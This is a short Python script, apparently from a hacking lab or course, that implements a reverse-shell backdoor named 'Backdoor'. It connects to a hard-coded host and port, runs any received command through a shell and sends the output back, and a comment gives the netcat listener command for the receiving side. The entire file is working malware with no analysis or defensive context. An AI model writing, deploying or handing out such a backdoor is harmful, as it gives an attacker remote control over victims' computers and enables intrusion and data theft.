# nc -vv -l -p 4444

import socket
import subprocess


class Backdoor:
    def __init__(self, ip, port, start=True):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

        if start:
            self.run()

    def execute_system_command(self, command):
        command = command.decode()
        return subprocess.check_output(command, shell=True)

    def run(self):
        while True:
            command = self.connection.recv(1024)
            command_result = self.execute_system_command(command)
            self.connection.send(command_result)


Backdoor('10.0.2.13', 4444)
